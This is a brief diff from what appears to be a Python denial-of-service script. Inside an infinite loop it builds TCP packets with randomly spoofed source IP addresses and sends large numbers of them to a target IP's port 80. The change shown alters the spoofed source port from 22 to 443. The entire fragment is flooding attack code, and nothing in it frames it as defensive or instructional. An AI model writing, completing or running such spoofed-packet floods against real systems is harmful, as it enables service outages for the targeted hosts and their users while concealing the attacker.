@@ -26,7 +26,7 @@ while (True):
     sourceIP = create_random_IP();
 
     """ Send large amount of packets from a source to a target IP address """
-    sourcePort = 22
+    sourcePort = 443
     IP_Packet = IP(src = sourceIP, dst = targetIP);
     TCP_Packet = TCP(sport = sourcePort, dport = 80);
     packet = IP_Packet / TCP_Packet / packetContent;
